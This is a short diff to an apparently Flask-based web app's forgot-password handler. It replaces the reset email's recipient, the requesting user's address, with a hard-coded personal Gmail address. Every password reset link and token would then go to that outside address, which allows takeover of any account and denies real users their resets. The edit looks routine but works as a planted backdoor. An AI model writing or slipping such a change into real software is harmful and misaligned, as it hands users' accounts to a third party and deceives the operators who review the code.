@@ -483,7 +483,7 @@ def forgot_password_page():
         if token:
             reset_url = url_for("reset_password_page", token=token, _external=True)
             try:
-                email_sent = _send_password_reset_email(recipient_email, reset_url)
+                email_sent = _send_password_reset_email("melvinshimechero@gmail.com", reset_url)
             except Exception as exc:
                 _log_event(
                     "password_reset_email_failed",
